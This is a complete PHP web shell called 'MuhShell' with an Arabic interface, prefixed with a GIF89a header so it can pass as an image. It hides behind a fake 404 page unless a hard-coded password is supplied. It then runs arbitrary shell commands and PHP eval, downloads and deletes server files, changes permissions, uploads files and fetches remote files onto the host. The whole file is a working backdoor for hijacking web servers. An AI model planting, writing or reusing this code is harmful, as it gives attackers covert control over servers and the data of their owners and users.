GIF89a
<?php
@error_reporting(0);@ini_set('display_errors',0);@set_time_limit(0);@ignore_user_abort(true);@ob_end_clean();@header_remove();@header('X-Powered-By: nginx');
$password = 'admin';
if (!isset($_GET['u']) || $_GET['u'] !== $password) {
    http_response_code(404);
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}
function self_url($params = []) {
    $p = $_GET;
    unset($p['u']);
    $query = http_build_query(array_merge(['u' => $GLOBALS['password']], $p, $params));
    return basename(__FILE__) . '?' . $query;
}
function run($cmd) {
    $r = [];
    $funcs = ['exec','shell_exec','system','passthru','proc_open','popen'];
    foreach ($funcs as $f) {
        try {
            if (function_exists($f)) {
                if ($f === 'proc_open') {
                    $descspec = [['pipe','r'],['pipe','w'],['pipe','w']];
                    $p = proc_open($cmd, $descspec, $pipes);
                    $r[] = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    proc_close($p);
                } elseif ($f === 'popen') {
                    $h = popen($cmd . ' 2>&1', 'r');
                    $r[] = stream_get_contents($h);
                    pclose($h);
                } else {
                    $r[] = $f($cmd . ' 2>&1');
                }
                if (!empty(trim($r[count($r)-1]))) break;
            }
        } catch (Exception $e) {}
    }
    if (empty(implode('',$r))) {
        ob_start(); system($cmd); $r[] = ob_get_clean();
    }
    return implode("", $r);
}

function curl_grab($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return @file_get_contents($url);
}

$a = isset($_REQUEST['a']) ? $_REQUEST['a'] : '';
$c = isset($_REQUEST['c']) ? $_REQUEST['c'] : '';
$up = isset($_FILES['f']) ? $_FILES['f'] : null;
$out = '';
if ($a == 'exec' && $c) {
    $out = run($c);
} elseif ($a == 'info') {
    phpinfo(); exit;
} elseif ($a == 'down' && $c) {
    $file = realpath($c) ?: $c;
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
} elseif ($a == 'grab' && $c) {
    $content = curl_grab($c);
    if ($content) {
        $filename = basename(parse_url($c, PHP_URL_PATH)) ?: 'grab_'.time();
        file_put_contents($filename, $content);
        $out = "تم سحب الملف: $filename";
    } else { $out = 'فشل الجلب'; }
} elseif ($up && $up['tmp_name']) {
    $targetDir = $_REQUEST['d'] ?: getcwd();
    if (!is_dir($targetDir)) mkdir($targetDir, 0755, true);
    $target = rtrim($targetDir, '/').'/'.basename($up['name']);
    if (move_uploaded_file($up['tmp_name'], $target)) $out = "رفع ناجح: $target";
    else $out = 'فشل الرفع';
} elseif ($a == 'del' && $c) {
    if (is_file($c)) { unlink($c); $out = 'تم حذف الملف'; }
    elseif (is_dir($c)) { rmdir($c); $out = 'تم حذف المجلد'; }
    else $out = 'غير موجود';
} elseif ($a == 'mkdir' && $c) {
    mkdir($c, 0755, true);
    $out = "تم إنشاء المجلد: $c";
} elseif ($a == 'chmod' && $c) {
    $mode = isset($_REQUEST['m']) ? octdec($_REQUEST['m']) : 0644;
    chmod($c, $mode);
    $out = 'تم تغيير الصلاحيات';
} elseif ($a == 'rename' && $c && isset($_REQUEST['to'])) {
    if (rename($c, $_REQUEST['to'])) $out = "تمت التسمية إلى: " . $_REQUEST['to'];
    else $out = 'فشلت التسمية';
} elseif ($a == 'eval' && $c) {
    ob_start(); eval($c); $out = ob_get_clean();
}

// تحديد المسار الحالي مع التنقل
$base = realpath(__DIR__);
$current = isset($_GET['d']) ? $_GET['d'] : $base;
if (is_dir($current)) {
    chdir($current);
} else {
    chdir($base);
}
$cwd = getcwd();

// مسار تنقري
$pathParts = explode(DIRECTORY_SEPARATOR, $cwd);
$breadcrumb = '';
$build = '';
foreach ($pathParts as $part) {
    if ($part === '') continue;
    $build .= DIRECTORY_SEPARATOR . $part;
    $breadcrumb .= ' / <a href="'.self_url(['d' => $build]).'">'.$part.'</a>';
}
$parent = dirname($cwd);
$isRoot = ($cwd == $parent);
?>
<!DOCTYPE html>
<html dir="rtl">
<head><meta charset="UTF-8"><title>File Manager</title>
<style>
body{background:#0a0a0a;color:#aaa;font:14px monospace;margin:0;padding:10px;display:flex;justify-content:center;min-height:100vh}
a{color:#c33}input,textarea,select,button{background:#1a1a1a;border:1px solid #333;color:#ccc;padding:8px;border-radius:3px;font-family:monospace;box-sizing:border-box;margin:5px 0}
button{background:#900;border-color:#600;cursor:pointer}button:hover{background:#b00}
table{width:100%;border-collapse:collapse}td,th{padding:5px;border-bottom:1px solid #222;text-align:right}
.box{border:1px solid #333;border-radius:6px;padding:15px;margin:10px 0;background:#0f0f0f}
.flex{display:flex;gap:10px}.hidden{display:none}
#nav a{color:#ccc}#nav{background:#111;padding:8px;border-radius:4px;margin:10px 0}
</style>
</head>
<body>
<div style="width:100%;max-width:900px">
<h1 style="color:#900">☠️ MuhShell</h1>
<div id="nav">
    <strong>المسار: </strong><?php echo $breadcrumb ?: ' /'; ?>
    <?php if (!$isRoot): ?>
        | <a href="<?php echo self_url(['d' => $parent]); ?>">⬆️ المجلد الأعلى</a>
    <?php endif; ?>
    | <a href="<?php echo self_url(['d' => $base]); ?>">🏠 الرئيسية</a>
</div>

<div class="box">
  <form method="post" action="<?php echo self_url(); ?>">
    <input type="hidden" name="u" value="<?php echo $password; ?>">
    <input type="text" name="c" placeholder="أدخل الأمر..." value="<?php echo htmlspecialchars($c); ?>">
    <div class="flex">
      <button type="submit" name="a" value="exec">▶ تنفيذ</button>
      <button type="button" onclick="toggle('info')">ℹ️</button>
      <button type="button" onclick="toggle('upload')">📤</button>
      <button type="button" onclick="toggle('tools')">🔧</button>
    </div>
  </form>
  <?php if($out) echo '<pre>'.htmlspecialchars($out).'</pre>'; ?>
  <div id="info" class="hidden"><pre>
المسار: <?php echo $cwd; ?>
المستخدم: <?php echo get_current_user(); ?>
النظام: <?php echo PHP_OS; ?>
PHP: <?php echo PHP_VERSION; ?>
المساحة: <?php echo disk_free_space($cwd); ?> بايت
الدوال المعطلة: <?php echo ini_get('disable_functions') ?: 'لا يوجد'; ?>
  </pre></div>
  <div id="upload" class="hidden">
    <form method="post" enctype="multipart/form-data" action="<?php echo self_url(); ?>">
      <input type="hidden" name="u" value="<?php echo $password; ?>">
      <input type="file" name="f">
      <input type="text" name="d" placeholder="المجلد الهدف (اختياري)" value="<?php echo htmlspecialchars($cwd); ?>">
      <button type="submit">رفع</button>
    </form>
  </div>
  <div id="tools" class="hidden">
    <button onclick="promptAction('cd','المسار')">📂 تغيير المسار</button>
    <button onclick="promptAction('mkdir','اسم المجلد')">📁 مجلد جديد</button>
    <button onclick="promptAction('del','المسار')">🗑️ حذف</button>
    <button onclick="promptAction('chmod','المسار')">🔐 صلاحيات</button>
    <button onclick="promptAction('rename','المسار القديم')">✏️ إعادة تسمية</button>
    <button onclick="promptAction('grab','الرابط')">📥 جلب من رابط</button>
    <button onclick="promptAction('eval','كود PHP')">⚡ eval</button>
  </div>
</div>

<table>
<tr><th>الاسم</th><th>الحجم</th><th>آخر تعديل</th><th>إجراءات</th></tr>
<?php
$items = scandir($cwd);
$folders = []; $files = [];
foreach ($items as $item) {
    if ($item == '.') continue;
    $fullPath = $cwd . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullPath)) $folders[] = $item;
    else $files[] = $item;
}
// رابط المجلد الأعلى
echo '<tr><td colspan="4"><a href="'.self_url(['d' => $parent]).'">📁 ..</a></td></tr>';
foreach ($folders as $f) {
    $full = $cwd . DIRECTORY_SEPARATOR . $f;
    echo '<tr>
        <td>📁 <a href="'.self_url(['d' => $full]).'">'.htmlspecialchars($f).'</a></td>
        <td>&lt;DIR&gt;</td>
        <td>'.date('Y-m-d H:i', filemtime($full)).'</td>
        <td>
            <a href="'.self_url(['a'=>'del','c'=>$full]).'" onclick="return confirm(\'متأكد؟\')">🗑️</a>
            <a href="'.self_url(['a'=>'rename','c'=>$full]).'">✏️</a>
        </td>
    </tr>';
}
foreach ($files as $f) {
    $full = $cwd . DIRECTORY_SEPARATOR . $f;
    $size = filesize($full);
    echo '<tr>
        <td>📄 '.htmlspecialchars($f).'</td>
        <td>'.$size.'</td>
        <td>'.date('Y-m-d H:i', filemtime($full)).'</td>
        <td>
            <a href="'.self_url(['a'=>'down','c'=>$full]).'">⬇️</a>
            <a href="'.self_url(['a'=>'del','c'=>$full]).'" onclick="return confirm(\'متأكد؟\')">🗑️</a>
        </td>
    </tr>';
}
?>
</table>
</div>
<script>
function toggle(id) { document.getElementById(id).classList.toggle('hidden'); }
function promptAction(a, placeholder) {
    var val = prompt(placeholder);
    if (val) window.location = '<?php echo self_url(); ?>' + '&a=' + a + '&c=' + encodeURIComponent(val);
}
</script>
</body>
</html>
